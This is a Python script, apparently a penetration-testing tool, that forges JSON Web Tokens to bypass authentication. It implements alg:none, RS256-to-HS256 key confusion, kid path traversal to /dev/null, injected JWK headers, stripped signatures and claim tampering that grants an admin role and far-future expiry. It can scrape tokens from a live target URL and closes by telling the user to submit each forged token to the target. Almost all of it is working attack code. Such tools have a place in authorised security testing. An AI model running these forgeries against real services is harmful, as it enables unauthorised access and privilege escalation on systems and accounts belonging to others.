#!/usr/bin/env python3
"""
JWT advanced testing.

Beyond basic alg:none / weak secret bruteforce — tests modern attack classes:
- KID path traversal (kid: ../../../dev/null with HMAC over empty file)
- Algorithm confusion (RS256 → HS256 with public key as HMAC secret)
- JWK injection (embed your own public key in header)
- CVE-2025-4692 alg confusion in cloud
- CVE-2025-30144 signature skip
- Critical claim manipulation

Usage:
    python3 jwt_advanced.py --token "eyJ..." --output ./out
    python3 jwt_advanced.py --target https://api.example.com --auto-extract
"""

import argparse
import base64
import hashlib
import hmac
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

import requests


def b64url_decode(data: str) -> bytes:
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def parse_jwt(token: str) -> tuple[dict, dict, bytes]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a JWT (need 3 parts)")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    signature = b64url_decode(parts[2])
    return header, payload, signature


def test_alg_none(token: str) -> dict:
    """Classic alg:none bypass."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    crafted = f"{new_header}.{parts[1]}."
    return {"test": "alg_none", "crafted_token": crafted, "severity": "critical"}


def test_alg_confusion(token: str, public_key: str = None) -> dict:
    """RS256 → HS256 with public key as HMAC secret (CVE-2025-4692)."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    if not header.get("alg", "").startswith(("RS", "ES", "PS")):
        return {"test": "alg_confusion", "skipped": "non-asymmetric token"}
    header["alg"] = "HS256"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = parts[1]

    candidates = []
    if public_key:
        candidates.append(public_key.encode())
    candidates.extend([b"", b"\x00", b"public", b"secret"])

    crafted_tokens = []
    for key in candidates:
        msg = f"{new_header}.{payload_b64}".encode()
        sig = hmac.new(key, msg, hashlib.sha256).digest()
        crafted_tokens.append({
            "key_used": key.decode(errors="ignore")[:50] or "<empty>",
            "token": f"{new_header}.{payload_b64}.{b64url_encode(sig)}",
        })
    return {"test": "alg_confusion", "crafted_tokens": crafted_tokens, "severity": "critical"}


def test_kid_traversal(token: str) -> dict:
    """KID path traversal — kid: ../../../dev/null + HMAC over empty file."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    header["alg"] = "HS256"
    header["kid"] = "../../../dev/null"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    msg = f"{new_header}.{parts[1]}".encode()
    sig = hmac.new(b"", msg, hashlib.sha256).digest()  # HMAC over empty
    crafted = f"{new_header}.{parts[1]}.{b64url_encode(sig)}"
    return {"test": "kid_traversal", "crafted_token": crafted, "severity": "high"}


def test_jwk_injection(token: str) -> dict:
    """Embed our own JWK in header — server may use it for verification."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    header["alg"] = "HS256"
    header["jwk"] = {
        "kty": "oct",
        "k": b64url_encode(b"attacker_key"),
    }
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    msg = f"{new_header}.{parts[1]}".encode()
    sig = hmac.new(b"attacker_key", msg, hashlib.sha256).digest()
    crafted = f"{new_header}.{parts[1]}.{b64url_encode(sig)}"
    return {"test": "jwk_injection", "crafted_token": crafted, "severity": "high"}


def test_signature_skip(token: str) -> dict:
    """CVE-2025-30144 — some libs skip signature verification if the 3rd part is empty."""
    parts = token.split(".")
    crafted = f"{parts[0]}.{parts[1]}."
    return {"test": "signature_skip", "crafted_token": crafted, "severity": "critical"}


def test_critical_claims(token: str) -> dict:
    """Manipulate exp/nbf/iat claims."""
    parts = token.split(".")
    payload = json.loads(b64url_decode(parts[1]))
    crafted_set = []
    for tweak_name, tweak in [
        ("admin_role", lambda p: {**p, "role": "admin", "is_admin": True}),
        ("expired_to_future", lambda p: {**p, "exp": 9999999999}),
        ("nbf_past", lambda p: {**p, "nbf": 0}),
    ]:
        new_payload = b64url_encode(json.dumps(tweak(payload), separators=(",", ":")).encode())
        crafted_set.append({
            "tweak": tweak_name,
            "token": f"{parts[0]}.{new_payload}.{parts[2]}",
        })
    return {"test": "critical_claims", "variations": crafted_set, "severity": "high"}


def jwt_tool_run(token: str, output_dir: Path) -> dict:
    """Wrapper for jwt_tool if installed."""
    if not shutil.which("jwt_tool"):
        return {"jwt_tool": "not_installed",
                "install": "pip install jwt-tool OR git clone https://github.com/ticarpi/jwt_tool"}
    try:
        r = subprocess.run(
            ["jwt_tool", token, "-M", "at"],
            capture_output=True, text=True, timeout=120,
        )
        out = output_dir / "jwt_tool.txt"
        out.write_text(r.stdout + "\n" + r.stderr)
        return {"jwt_tool": "ran", "output": str(out)}
    except Exception as e:
        return {"jwt_tool": "error", "error": str(e)}


def auto_extract_token(url: str) -> str | None:
    try:
        r = requests.get(url, timeout=10)
        m = re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", r.text)
        if m:
            return m.group(0)
        for h, v in r.headers.items():
            m = re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", str(v))
            if m:
                return m.group(0)
    except Exception:
        pass
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", help="JWT token to test")
    ap.add_argument("--target", help="URL to extract token from")
    ap.add_argument("--public-key", help="Public key for alg confusion (PEM)")
    ap.add_argument("--output", required=True)
    ap.add_argument("--auto-extract", action="store_true")
    args = ap.parse_args()

    out = Path(args.output)
    out.mkdir(parents=True, exist_ok=True)

    token = args.token
    if args.auto_extract and args.target:
        token = auto_extract_token(args.target)
        if not token:
            sys.exit("[!] No JWT found on target")
        print(f"[+] Extracted token: {token[:50]}...")

    if not token:
        sys.exit("Need --token or --target with --auto-extract")

    try:
        header, payload, _ = parse_jwt(token)
    except Exception as e:
        sys.exit(f"[!] Invalid JWT: {e}")

    print(f"[*] Token alg: {header.get('alg')}")
    print(f"[*] Token kid: {header.get('kid', '<none>')}")

    results = {
        "header": header,
        "payload": payload,
        "tests": [],
    }

    results["tests"].append(test_alg_none(token))
    results["tests"].append(test_alg_confusion(token, args.public_key))
    results["tests"].append(test_kid_traversal(token))
    results["tests"].append(test_jwk_injection(token))
    results["tests"].append(test_signature_skip(token))
    results["tests"].append(test_critical_claims(token))
    results["jwt_tool"] = jwt_tool_run(token, out)

    out_file = out / "jwt_advanced.json"
    out_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))

    print(f"[+] Generated {len(results['tests'])} test variants")
    print(f"[+] Saved to {out_file}")
    print("[i] Submit each crafted_token to target endpoint and check response")


if __name__ == "__main__":
    main()
